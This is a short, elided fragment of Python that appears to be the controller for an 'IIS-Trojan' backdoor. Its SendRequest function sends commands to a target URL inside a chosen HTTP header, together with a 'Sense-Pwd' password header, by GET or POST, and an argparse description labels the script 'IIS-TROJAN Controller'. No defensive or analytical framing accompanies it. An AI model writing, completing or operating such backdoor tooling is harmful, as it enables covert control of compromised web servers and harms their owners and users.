...
def SendRequest(data):
	...
	if(args.method == "GET"):
		resp = requests.get(args.url,headers={args.header: data , "Sense-Pwd": args.password})
	elif(args.method == "POST"):
		resp = requests.post(args.url,headers={args.header: data , "Sense-Pwd": args.password})
...
# IIS-Trojan
parser = argparse.ArgumentParser(description="IIS-TROJAN Controller")
